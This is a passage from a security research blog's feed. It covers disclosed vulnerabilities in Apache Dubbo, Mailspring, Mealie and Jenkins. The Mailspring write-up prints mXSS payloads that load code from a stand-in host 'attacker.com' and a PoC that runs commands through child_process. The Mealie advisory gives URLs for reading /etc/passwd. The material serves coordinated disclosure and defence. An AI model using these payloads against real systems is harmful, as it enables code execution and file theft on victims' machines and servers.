provider.</p><img src="/img/blogs/apache-dubbo/image2.png" style="width: 100%;"/><h1 id="Apache-Response"><a href="#Apache-Response" class="headerlink" title="Apache Response"></a>Apache Response</h1><p>After reporting our findings to Apache, they claimed that the risk of malicious providers or infiltration using an unprotected registry is introduced by the user. Following our communication explaining that this threat model was unclear to us and likely to users of the framework, Apache <a href="https://github.com/apache/dubbo-website/commit/cd1be029d5adb3ac398a09ca4e5f3da2a55b7323">updated</a> its documentation accordingly.</p><h1 id="Timeline"><a href="#Timeline" class="headerlink" title="Timeline"></a>Timeline</h1><table><thead><tr><th>Date</th><th>Action</th></tr></thead><tbody><tr><td>2023-08-28</td><td>We report all issues to the vendor.</td></tr><tr><td>2023-09-29</td><td>Vendor disputed the report claiming this attack is not considered in their threat model.</td></tr><tr><td>2023-12-15</td><td>After back-and-forth communication, the vendor agreed that their point of view was not conveyed through the documentation and <a href="https://github.com/apache/dubbo-website/commit/cd1be029d5adb3ac398a09ca4e5f3da2a55b7323">updated</a> it accordingly.</td></tr></tbody></table><h1 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h1><p>This blog covered a different way of introducing security risks into an Apache Dubbo infrastructure. Despite it being disputed by the vendor, we are confident that our research helps contribute to the documentation and, alongside this publication, makes users aware of those risks.  </p><p>This example showcased misinterpretation due to confusing flag verification. Additionally, it highlighted the absence of a well-defined threat model, which can bewilder users. At Sonar, we stress the significance of Clean Code as it enhances code readability, maintainability, and security. Clean Code promotes clear and concise code structures, making it easier for developers to identify potential vulnerabilities and implement appropriate security measures. By adhering to Clean Code principles, organizations can minimize the risk of security breaches and ensure the integrity of their software applications.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;&lt;p&gt;Apache Dubbo is a popular Java</summary>
      
    
    
    
    
    <category term="deserialization" scheme="https://yaniv-git.github.io/tags/deserialization/"/>
    
    <category term="java" scheme="https://yaniv-git.github.io/tags/java/"/>
    
    <category term="apache" scheme="https://yaniv-git.github.io/tags/apache/"/>
    
    <category term="rpc" scheme="https://yaniv-git.github.io/tags/rpc/"/>
    
    <category term="rce" scheme="https://yaniv-git.github.io/tags/rce/"/>
    
    <category term="disputed" scheme="https://yaniv-git.github.io/tags/disputed/"/>
    
  </entry>
  
  <entry>
    <title>Reply to calc: The Attack Chain to Compromise Mailspring</title>
    <link href="https://yaniv-git.github.io/2024/03/10/Reply%20to%20calc:%20The%20Attack%20Chain%20to%20Compromise%20Mailspring/"/>
    <id>https://yaniv-git.github.io/2024/03/10/Reply%20to%20calc:%20The%20Attack%20Chain%20to%20Compromise%20Mailspring/</id>
    <published>2024-03-10T23:00:00.000Z</published>
    <updated>2025-07-08T15:29:30.241Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>Mailspring, formerly known as <a href="https://github.com/nylas/nylas-mail">nylas-mail</a>, is a popular email client application that gives users a fast and efficient way to manage their email accounts. It is a free and open-source program for Windows, Mac, and Linux operating systems. Mailspring comes with a variety of advanced features, such as snoozing emails, scheduling messages, email tracking, and more. It also supports a wide range of email services, including Gmail, Yahoo, Outlook, and more. With its user-friendly interface and powerful functionality, Mailspring has become a popular choice for those looking for a reliable and versatile email client.</p><p>Continuing our effort to improve open-source security and enhance our Clean Code technology, we decided to research and evaluate the security of the Mailspring desktop application. Considering its popularity, security issues in the application have a high impact potential. In this blog, we will present our research and findings. </p><h1 id="Impact"><a href="#Impact" class="headerlink" title="Impact"></a>Impact</h1><p>Mailspring versions before 1.11.0 are susceptible to several vulnerabilities, enabling an attacker to execute arbitrary code when a victim tries to reply to or forward a malicious email.</p><iframe width="736" height="414" src="https://www.youtube.com/embed/rbeHR2Tq3dM" title="Reply to Calc: the Attack Chain to Compromise Mailspring" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe><p>Mailspring version 1.11.0 employs mitigations to prevent exploitation. However, the underlying vulnerability has not been fixed as of today.</p><h1 id="Technical-Details-CVE-2023-47479"><a href="#Technical-Details-CVE-2023-47479" class="headerlink" title="Technical Details - CVE-2023-47479"></a>Technical Details - CVE-2023-47479</h1><p>In the following section, we will explain the technical details of the vulnerabilities, which are tracked as CVE-2023-47479. We will describe how an attacker can bypass some mitigations to ultimately achieve code execution when a user replies to or forwards a malicious email. </p><h2 id="mXSS-Background"><a href="#mXSS-Background" class="headerlink" title="mXSS Background"></a>mXSS Background</h2><p>Mutation Cross-Site Scripting (mXSS) is a sophisticated variation of the well-known Cross-Site Scripting (XSS) vulnerability. When an application needs to safely render the user’s input as HTML, to support some HTML features, sanitization would be the solution. Allowing specific tags and attributes while stripping or encoding others. Unfortunately, this is not a straightforward task since HTML is a syntax-tolerant language that may change or “mutate” when parsing. mXSS takes advantage of that by providing a payload that seems innocent initially when parsing (during the sanitization process) but mutates it to a malicious one when re-parsing it (in the final stage of displaying the content).</p><h2 id="mXSS-in-the-Email-Renderer"><a href="#mXSS-in-the-Email-Renderer" class="headerlink" title="mXSS in the Email Renderer"></a>mXSS in the Email Renderer</h2><p>Before rendering and showing an email to the user, Mailspring sanitizes the content with a <a href="https://github.com/Foundry376/Mailspring/blob/a3aecf628a77d51badaa7a8860acffab0f1afcb3/app/src/services/sanitize-transformer.ts#L527">built-in sanitizer</a>. The sanitizer uses <code>DOMParser</code> and, according to a predefined list, will accept, remove, or replace tags and content. Problems occur when the sanitizer changes a disallowed tag after the parsing is done, causing the resulting content to be parsed differently.</p><p>For example, we will use the following email content:<br><img src="/img/blogs/mailspring/image11.png" style="width: 100%;"/></p><p>Parsing the given string to a DOM tree will result in an <code>a</code> tag inside the <code>style</code> as expected within “<a href="https://html.spec.whatwg.org/#parsing-main-inforeign">foreign content</a>”, this is because <code>style</code> is handled differently in <a href="https://infra.spec.whatwg.org/#svg-namespace">SVG</a>&#x2F;<a href="https://infra.spec.whatwg.org/#mathml-namespace">MathML</a> namespaces:</p><img src="/img/blogs/mailspring/image9.png" style="width: 100%;"/><p>Mailspring doesn’t allow <code>svg</code> tags and will <a href="https://github.com/Foundry376/Mailspring/blob/a3aecf628a77d51badaa7a8860acffab0f1afcb3/app/src/services/sanitize-transformer.ts#L478">replace</a> them with <code>span</code> tags during the sanitization. We covered the risk of “Desanitization” (the act of changing and interfering with the sanitizer’s output) in previous blogs where we encountered other vulnerabilities that follow this dangerous behavior: </p><ul><li><a href="https://www.sonarsource.com/blog/pitfalls-of-desanitization-leaking-customer-data-from-osticket/">Pitfalls of Desanitization: Leaking Customer Data from osTicket</a></li><li><a href="https://www.sonarsource.com/blog/code-vulnerabilities-leak-emails-in-proton-mail/">Code Vulnerabilities Put Proton Mails at Risk</a></li><li><a href="https://www.sonarsource.com/blog/code-vulnerabilities-put-skiff-emails-at-risk/">Code Vulnerabilities Put Skiff Emails at Risk</a></li><li>And more</li></ul><p>Because Mailspring continues iterating over the manipulated sanitizer’s output using the same parsed DOM tree, it would still seem as if there were a foreign content tag (<code>svg</code> and not <code>span</code>):</p><img src="/img/blogs/mailspring/image10.png" style="width: 100%;"/><p>This is why the sanitizer can’t see the malicious tag, but later, when embedding the result in the page, the <code>style</code> tag won’t be inside a “<a href="https://html.spec.whatwg.org/#parsing-main-inforeign">foreign content</a>” and thus closes where the <code>title</code> attribute used to be:</p><img src="/img/blogs/mailspring/image5.png" style="width: 100%;"/><p>We can see our injected tag in the rendered content. But it is inside a sandboxed iframe, stopping it from executing any JavaScript code.</p><img src="/img/blogs/mailspring/image15.png" style="width: 100%;"/><h2 id="Bypassing-the-mitigations"><a href="#Bypassing-the-mitigations" class="headerlink" title="Bypassing the mitigations"></a>Bypassing the mitigations</h2><h3 id="Sandboxed-Iframe"><a href="#Sandboxed-Iframe" class="headerlink" title="Sandboxed Iframe"></a>Sandboxed Iframe</h3><p>There is not much an attacker can do inside a sandboxed iframe, but we noticed that when a user replies to or forwards an email, the content of it will be rendered again outside of the sandboxed iframe.</p><img src="/img/blogs/mailspring/image14.png" style="width: 50%;"/><p>However, the injected JavaScript code will still not run because of a Content Security Policy in the main window:</p><img src="/img/blogs/mailspring/image12.png" style="width: 100%;"/><img src="/img/blogs/mailspring/image13.png" style="width: 100%;"/><h3 id="Content-Security-Policy-Bypass"><a href="#Content-Security-Policy-Bypass" class="headerlink" title="Content Security Policy Bypass"></a>Content Security Policy Bypass</h3><p>When evaluating this policy, we noticed that there is a misconfiguration:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;default-src * mailspring:; script-src &#x27;self&#x27; chrome-extension://react-developer-tools; style-src * &#x27;unsafe-inline&#x27; mailspring:; img-src * data: mailspring: file:;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Because <code>default-src</code> is set to <code>*</code> and there’s no <code>object-src</code> override, an attacker can execute code with an <code>object</code> tag. This is limited to JavaScript files served via the <code>http</code>, <code>https</code>, <code>ws</code>, and <code>wss</code> protocols by default.</p><p>In addition to that, <code>script-src &#39;self&#39;</code> allows using a <code>script</code> tag with a local file as a <code>src</code> to execute JavaScript code. This works because Electron, the underlying technology behind Mailspring,  serves the UI via the <code>file://</code> protocol. To abuse this, an attacker must control a file on the victim’s computer and point to it via a script’s <code>src</code> attribute.</p><p>However, when sending a new payload that uses a malicious <code>object</code> tag to bypass the CSP, replying to&#x2F;forwarding it, would mysteriously remove our tag. This did not happen for the initial payload with the <code>img</code> tag, so what is going on here?</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">style</span>&gt;</span>&lt;a title=&quot;<span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;<span class="name">object</span> <span class="attr">data</span>=<span class="string">&#x27;https://attacker.com/payload&#x27;</span>&gt;</span>&quot;&gt;</span><br></pre></td></tr></table></figure><p>Email body:</p><img src="/img/blogs/mailspring/image2.png" style="width: 100%;"/><p>Reply-to&#x2F;forward content:</p><img src="/img/blogs/mailspring/image4.png" style="width: 100%;"/><p>There must be another sanitization when replying to or forwarding an email.</p><img src="/img/blogs/mailspring/image1.png" style="width: 100%;"/><h3 id="reply-to-forward-sanitization-bypass"><a href="#reply-to-forward-sanitization-bypass" class="headerlink" title="reply-to&#x2F;forward sanitization bypass"></a>reply-to&#x2F;forward sanitization bypass</h3><p>Drilling down to the component that handles the reply&#x2F;forward window, we came across <a href="https://github.com/Foundry376/Mailspring/blob/1.10.8/app/src/decorators/inflates-draft-client-id.tsx#L77">inflates-draft-client-id.jsx</a>. The <code>draft</code> content still contains our <code>object</code> tag at this point but will later be removed, so this content is before the 2nd sanitization. </p><img src="/img/blogs/mailspring/image8.png" style="width: 100%;"/><p>Looking at this HTML draft snippet, we understand that Mailspring adds content to the window, such as the user’s mail signature, custom CSS, timestamp, etc. The <code>signature</code> tag at the start of the draft caught our attention. Since it’s a custom tag and appended before the replied&#x2F;forwarded malicious email content, maybe the sanitization there is different? </p><p>Indeed, embedding the malicious input in a <code>signature</code> tag avoided the 2nd sanitization. As a result, this payload allows the execution of arbitrary JavaScript code:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">style</span>&gt;</span>&lt;a title=&quot;<span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;<span class="name">signature</span>&gt;</span><span class="tag">&lt;<span class="name">object</span> <span class="attr">data</span>=<span class="string">&#x27;https://attacker.com/payload&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">object</span>&gt;</span><span class="tag">&lt;/<span class="name">signature</span>&gt;</span>&quot;&gt;</span><br></pre></td></tr></table></figure><img src="/img/blogs/mailspring/image7.png" style="width: 100%;"/><h2 id="From-XSS-to-RCE"><a href="#From-XSS-to-RCE" class="headerlink" title="From XSS to RCE"></a>From XSS to RCE</h2><p>The <a href="https://github.com/Foundry376/Mailspring/blob/3be72eee5c10a43f6fb9924ab1e9a33bb0f5216e/app/src/browser/mailspring-window.ts#L100">main</a> window of Mailspring uses <code>nodeIntegration: true</code> and <code>contextIsolation: false</code>, meaning any JavaScript code that runs in this context can also access the internal NodeJS objects and thus execute arbitrary code on the machine. Because the payload until this point has been executed in the origin of <code>attacker.com</code>, which blocks the attacker from accessing the main parent window due to the <a href="https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy">same-origin policy</a>, an attacker would need to find a way to escalate the impact from XSS to RCE. </p><p>From here, we came up with two different vectors:</p><h3 id="Outdated-Electron-V8-Vulnerability"><a href="#Outdated-Electron-V8-Vulnerability" class="headerlink" title="Outdated Electron V8 Vulnerability"></a>Outdated Electron V8 Vulnerability</h3><p>Mailspring runs on an outdated electron, thus a chromium version that is susceptible to <a href="https://nvd.nist.gov/vuln/detail/CVE-2022-1364">CVE-2022-1364</a>, and potentially other 1days (running <code>window.navigator.userAgent</code> on the dev tools gives the following value):</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Mozilla</span>/<span class="number">5</span>.<span class="number">0</span> (Macintosh; Intel Mac OS X <span class="number">10</span>_15_7) AppleWebKit/<span class="number">537</span>.<span class="number">36</span> (KHTML, like Gecko) Mailspring/<span class="number">1</span>.<span class="number">10</span>.<span class="number">8</span> Chrome/<span class="number">98</span>.<span class="number">0</span>.<span class="number">4758</span>.<span class="number">141</span> Electron/<span class="number">17</span>.<span class="number">4</span>.<span class="number">0</span> Safari/<span class="number">537</span>.<span class="number">36</span></span><br></pre></td></tr></table></figure><p>An attacker can use known exploits to gain full command execution regardless of Electron’s origin isolation.</p><h3 id="CSS-Exfiltration"><a href="#CSS-Exfiltration" class="headerlink" title="CSS Exfiltration"></a>CSS Exfiltration</h3><p>The XSS shown above is executed from an external website origin, stopping the JavaScript from accessing the <code>top</code> window due to the <a href="https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy">Same-origin-policy</a>. For a window to be able to access its parent, both should be same-origin. Since Mailspring runs on the <code>file://</code> scheme, any framed window (<code>object</code>, <code>iframe</code>, <code>embed</code>, etc.) that is also from the <code>file://</code> scheme can access the main window (and then node internals).</p><p>For that, an attacker needs to have control over a file on the machine; this can be achieved with attachment files. After sending an email with an attachment, we saw that the files are moved to a randomly <a href="https://github.com/Foundry376/Mailspring/blob/3be72eee5c10a43f6fb9924ab1e9a33bb0f5216e/app/src/flux/stores/attachment-store.ts#L67">generated directory</a> under <code>…/Mailspring/files/&lt;random-id&gt;.substr(0, 2)/&lt;random&gt;.substr(2, 2)/&lt;random-id&gt;/attachment_file</code>. This path is not reflected in the DOM and cannot be guessed.</p><p>But sending an <a href="https://stackoverflow.com/questions/6706891/embedding-image-in-html-email">inline image</a> (with CID) will cause the path to be reflected in the DOM. Using that, an attacker can use known <a href="https://book.hacktricks.xyz/pentesting-web/xs-search/css-injection">CSS exfiltration techniques</a>, given that CSS is allowed by Mailspring’s sanitizer, to extract the random path of the controlled file. Then use the same XSS as before but point the <code>object</code>’s <code>data</code> tag to the controlled file. Since it’s the same origin as the main window, accessing <code>parent</code> and running arbitrary node commands is possible.<br><img src="/img/blogs/mailspring/image3.png" style="width: 100%;"/></p><p>The POC:</p><ol><li>Attacker sets up a CSS exfiltration server.</li><li>Attacker sends an email with the CSS exfiltration payload and an inline “image” which is actually the following malicious HTML page: <code>&lt;script&gt;top.require(&#39;child_process&#39;).execSync(&#39;open -a Calculator&#39;)&lt;/script&gt;</code></li><li>When the victim views the email, the payload “image” path is extracted.</li><li>Attacker sends a second email with the mXSS payload pointing to the extracted path: <code>&lt;svg&gt;&lt;style&gt;&lt;a title=&quot;&lt;/style&gt;&lt;signature&gt;&lt;object data=&#39;**extracte_path**&#39;&gt;&lt;/object&gt;&lt;/signature&gt;&quot;&gt;&lt;/style&gt;</code></li><li>When a victim tries to reply or forward the message, a calculator will show up.</li></ol><img src="/img/blogs/mailspring/image6.png" style="width: 100%;"/><h1 id="Patch"><a href="#Patch" class="headerlink" title="Patch"></a>Patch</h1><p>We tried contacting the maintainers in various ways, but due to unresponsiveness, the only implemented <a href="https://github.com/Foundry376/Mailspring/commit/5126294f589d94231ea8ec31a94847ccdf6f4dcb">fix</a> was hardening the CSP.</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="addition">+ object-src none; media-src mailspring:; manifest-src none;</span></span><br></pre></td></tr></table></figure><p>Despite the lack of proper attention and fix, there are several takeaways developers can take from these findings:</p><ul><li>Avoid interfering with data after the sanitization (<a href="https://www.sonarsource.com/blog/pitfalls-of-desanitization-leaking-customer-data-from-osticket/">Desanitization</a>).</li><li>Follow the <a href="https://www.electronjs.org/docs/latest/tutorial/security">official Electron Security documentation</a> which covers <a href="https://www.electronjs.org/docs/latest/tutorial/security#2-do-not-enable-nodejs-integration-for-remote-content">node integration</a>, <a href="https://www.electronjs.org/docs/latest/tutorial/security#3-enable-context-isolation">context isolation</a>, <a href="https://www.electronjs.org/docs/latest/tutorial/security#18-avoid-usage-of-the-file-protocol-and-prefer-usage-of-custom-protocols">file protocol</a>, and more.</li><li>Ensure your mitigation steps, such as <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP">CSP</a>, are configured correctly.</li></ul><h1 id="Timeline"><a href="#Timeline" class="headerlink" title="Timeline"></a>Timeline</h1><table><thead><tr><th>Date</th><th>Action</th></tr></thead><tbody><tr><td>2023-04-27</td><td>We report all issues to the vendor, including our disclosure policy</td></tr><tr><td>2023-05-11</td><td>We Ping the vendor</td></tr><tr><td>2023-05-23</td><td>We Ping the vendor using a personal email address</td></tr><tr><td>2023-06-26</td><td>We open a discrete issue on GitHub</td></tr><tr><td>2023-07-04</td><td>The vendor acknowledges the report</td></tr><tr><td>2023-07-29</td><td>The CSP policy is hardened</td></tr><tr><td>2023-08-09</td><td>We ping the vendor, offering help with the fixes</td></tr><tr><td>2023-09-05</td><td>We ping the vendor again with no success</td></tr><tr><td>2024-03-09</td><td>We notify the vendor about the release of this blog</td></tr></tbody></table><h1 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h1><p>In this blog, we covered a vulnerability chain that attackers might exploit to achieve RCE on a victim’s computer simply by manipulating them to click “reply-to” or “forward” from a malicious email. We explained the importance of avoiding the dangerous <a href="https://www.sonarsource.com/blog/pitfalls-of-desanitization-leaking-customer-data-from-osticket/">Desanitization</a> pattern and outlined the significance of a strong CSP.</p><p>To help you implement these critical aspects in your own code, Sonar provides a vast range of security rules, such as <a href="https://sonarsource.github.io/rspec/#/rspec/S5728">S5728</a>, which ensures that a default-src CSP directive is set. This reduces the impact of XSS vulnerabilities and follows the Clean Code principle, which emphasizes the creation of clear and maintainable software. This not only facilitates the detection and resolution of vulnerabilities throughout the development process but also reduces the risk of introducing security weaknesses that malicious actors could exploit.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;&lt;p&gt;Mailspring, formerly known as </summary>
      
    
    
    
    
    <category term="rce" scheme="https://yaniv-git.github.io/tags/rce/"/>
    
    <category term="electron" scheme="https://yaniv-git.github.io/tags/electron/"/>
    
    <category term="mxss" scheme="https://yaniv-git.github.io/tags/mxss/"/>
    
    <category term="csp" scheme="https://yaniv-git.github.io/tags/csp/"/>
    
    <category term="sop" scheme="https://yaniv-git.github.io/tags/sop/"/>
    
    <category term="sandbox" scheme="https://yaniv-git.github.io/tags/sandbox/"/>
    
  </entry>
  
  <entry>
    <title>Authenticated Arbitrary File Read in Mealie</title>
    <link href="https://yaniv-git.github.io/2024/01/31/Authenticated%20Arbitrary%20File%20Read%20in%20Mealie/"/>
    <id>https://yaniv-git.github.io/2024/01/31/Authenticated%20Arbitrary%20File%20Read%20in%20Mealie/</id>
    <published>2024-01-31T23:00:00.000Z</published>
    <updated>2025-07-08T15:29:30.239Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>Mealie before version 1.0.0 is vulnerable to authenticated arbitrary file read due to improper validation of the path in the <code>/api/recipes/bulk-actions/export/download</code> and <code>/api/utils/download</code> endpoints.</p><h1 id="Explotation"><a href="#Explotation" class="headerlink" title="Explotation"></a>Explotation</h1><ol><li>Fetch a valid JWT token from the URL:<br><code>http://Mealie-domain/api/recipes/bulk-actions/export/download?p ath=%2Fetc%2Fpasswd</code></li><li>Download the file using the JWT token provided:<br><code>http://Mealie-domain/api/utils/download?token=&lt;TOKEN&gt;</code></li></ol><h1 id="Impact"><a href="#Impact" class="headerlink" title="Impact"></a>Impact</h1><p>Any authenticated user can generate an API token and thus access the API. Using this<br>vulnerability, an authenticated attacker can read arbitrary files from the server leading to<br>different impacts from confidentiality to RCE via secrets&#x2F;keys exfiltration.</p><h1 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h1><p>Upgrade Mealie to version <code>1.0.0</code> or later</p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><ul><li><a href="https://github.com/mealie-recipes/mealie/pull/2867">Pull request</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Description&quot;&gt;&lt;a href=&quot;#Description&quot; class=&quot;headerlink&quot; title=&quot;Description&quot;&gt;&lt;/a&gt;Description&lt;/h1&gt;&lt;p&gt;Mealie before version 1.0.0 is vul</summary>
      
    
    
    
    
    <category term="arbitrary file read" scheme="https://yaniv-git.github.io/tags/arbitrary-file-read/"/>
    
  </entry>
  
  <entry>
    <title>Excessive Expansion: Uncovering Critical Security Vulnerabilities in Jenkins</title>
    <link href="https://yaniv-git.github.io/2024/01/23/Excessive%20Expansion:%20Uncovering%20Critical%20Security%20Vulnerabilities%20in%20Jenkins/"/>
    <id>https://yaniv-git.github.io/2024/01/23/Excessive%20Expansion:%20Uncovering%20Critical%20Security%20Vulnerabilities%20in%20Jenkins/</id>
    <published>2024-01-23T23:00:00.000Z</published>
    <updated>2025-07-08T15:29:30.240Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Key-Information"><a href="#Key-Information" class="headerlink" title="Key Information"></a>Key Information</h1><ul><li>Sonar’s Vulnerability Research Team has discovered security vulnerabilities in Jenkins, the leading open-source Continuous Integration and Continuous Deployment (CI&#x2F;CD) software.</li><li>The discovered Critical vulnerability tracked as CVE-2024-23897 allows unauthenticated attackers to read a limited amount of arbitrary files’ data, and “read-only” authorized attackers to an entire arbitrary file from Jenkins’ server.</li><li>Attackers could leverage this vulnerability, by reading Jenkins secrets, to escalate privileges to admin and eventually execute arbitrary code on the server.</li><li>The discovered High severity, cross-site WebSocket hijacking (CSWSH), vulnerability tracked as CVE-2024-23898, allows an attacker to execute arbitrary CLI commands by manipulating a victim to click on a link.</li><li>The vulnerabilities were fixed in Jenkins versions 2.442, and LTS 2.426.3.</li></ul><p>Jenkins is the leading open-source automation server widely used for building, deploying, and automating software projects. Originally developed as Hudson, Jenkins has evolved into a powerful tool for continuous integration and continuous delivery (CI&#x2F;CD). It enables developers to automate various aspects of the software development lifecycle, including building, testing, and deploying applications. With a market share of approximately <a href="https://cd.foundation/announcement/2023/08/29/jenkins-project-growth/">44% in 2023</a>, the popularity of Jenkins is evident. This means the potential impact of security vulnerabilities in Jenkins is large.</p><h1 id="Vulnerabilities-Impact"><a href="#Vulnerabilities-Impact" class="headerlink" title="Vulnerabilities Impact"></a>Vulnerabilities Impact</h1><p>Unauthenticated attackers can read the first few lines of arbitrary files from the server, while read-only authorized attackers can read the entire file. This could ultimately lead to the execution of arbitrary code in some cases (CVE-2024-23897). If one of the following conditions is met, even unauthenticated users have at least read permission:</p><ul><li>Legacy mode authorization is enabled.</li><li>Configuration “Allow anonymous read access” is checked in the “logged-in users can do anything” authorization mode.</li><li>The signup feature is enabled.</li></ul><p>The second vulnerability (CVE-2024-23898) resides within the WebSocket CLI feature, which lacks an origin check, allowing Cross-Site WebSocket Hijacking (CSWSH). This vulnerability might be exploited by sending a malicious link to a victim. Certain modern web browsers implement a “<a href="https://caniuse.com/mdn-http_headers_set-cookie_samesite_lax_default">lax by default</a>” policy, which serves as a potential safeguard against this vulnerability. Nonetheless, given that some widely used browsers like Safari and Firefox do not strictly enforce this policy, and considering the associated risks of potential <a href="https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions#bypassing-samesite-lax-restrictions-with-newly-issued-cookies">bypass</a> techniques or users using outdated browsers, the severity classification for this vulnerability is High.</p><iframe width="736" height="414" src="https://www.youtube.com/embed/ucs-XF5X3bE" title="Excessive Expansion: Uncovering Critical Security Vulnerabilities in Jenkins" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe><h1 id="Technical-Details"><a href="#Technical-Details" class="headerlink" title="Technical Details"></a>Technical Details</h1><p>In this section of the blog, we will explore our findings taking a deeper dive into the code, to understand the vulnerabilities and how an attacker could exploit them. During the Jenkins security team’s triaging of our report, they found further ways to exploit the first vulnerability (CVE-2024-23897) using an unauthenticated user. The following “Technical Details” covers the attack scenario of a read-only capable attacker. </p><h1 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h1><p>Jenkins provides multiple ways of authorization, the unsafe <em>“anyone can do anything”</em>, the <em>“legacy”</em> permissions, and <em>“logged-in users can do anything”</em>. The latter authorization method allows the option for anonymous read access and gives read permission to anyone, which is also the case in the <em>legacy</em> mode.</p><img src="/img/blogs/jenkins/image_1.webp" style="width: 100%;"/><p>On top of that, there is also the not recommended option to <em>“Allow users to sign up”</em>, which makes everyone at least read-only capable.</p><p>According to the <a href="https://www.jenkins.io/doc/book/security/access-control/permissions/#overall-read">official documentation</a>, read-only access allows users to:</p><ul><li>Access the basic Jenkins API and the API of any object they have access to.</li><li>Access the people directory listing user accounts and known committer identities of anyone involved in visible projects.</li><li>List and view all agents configured in Jenkins and access their summary pages.</li></ul><p>On the other hand, <a href="https://www.jenkins.io/doc/book/security/access-control/permissions/#administer">administrators</a> can pretty much do everything on a Jenkins instance. From an attacker’s point of view, admins can run arbitrary code on a Jenkins server.</p><h1 id="Jenkins-CLI-Feature-Background"><a href="#Jenkins-CLI-Feature-Background" class="headerlink" title="Jenkins-CLI Feature Background"></a>Jenkins-CLI Feature Background</h1><p><a href="https://www.jenkins.io/doc/book/managing/cli/">Jenkins-CLI</a> provides users with a built-in command line interface to execute custom commands that are implemented in the <a href="https://github.com/jenkinsci/jenkins/tree/jenkins-2.441/core/src/main/java/hudson/cli">hudson&#x2F;cli</a> directory of the Jenkins Git repository.</p><p>Aside from the common ways of invoking a command, using <code>jenkins-cli.jar</code> (which utilizes web sockets) or SSH, we found out that there is an additional option by sending two POST requests to <code>http://jenkins/cli?remoting=false</code>.</p><p>When <a href="https://github.com/jenkinsci/stapler">Stapler</a> (Jenkins’ component that correlates a method to an endpoint) is <a href="https://github.com/jenkinsci/stapler/blob/ea4fc6ed8cd1b5eca6b4ce80b35654da9376e2bc/core/src/main/java/org/kohsuke/stapler/Stapler.java#L725">getting</a> the relevant method of the <em>“&#x2F;cli”</em> path, the endpoint will throw a <a href="https://github.com/jenkinsci/jenkins/blob/3b0de10df3bedba515e13032104d4d84f83045be/core/src/main/java/hudson/cli/CLIAction.java#L195">PlainCliEndpointResponse()</a> exception, which will end up in this <a href="https://github.com/jenkinsci/jenkins/blob/824f64c23e52e5c765cc7604414740aab3436f8d/core/src/main/java/jenkins/util/FullDuplexHttpService.java#L166">generateResponse</a> function:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">generateResponse</span><span class="params">(StaplerRequest req, StaplerResponse rsp, Object node)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">UUID</span> <span class="variable">uuid</span> <span class="operator">=</span> UUID.fromString(req.getHeader(<span class="string">&quot;Session&quot;</span>));</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">        <span class="keyword">if</span> (req.getHeader(<span class="string">&quot;Side&quot;</span>).equals(<span class="string">&quot;download&quot;</span>)) &#123;</span><br><span class="line">            <span class="type">FullDuplexHttpService</span> <span class="variable">service</span> <span class="operator">=</span> createService(req, uuid);</span><br><span class="line">            <span class="comment">//...</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                service.download(req, rsp);</span><br><span class="line">            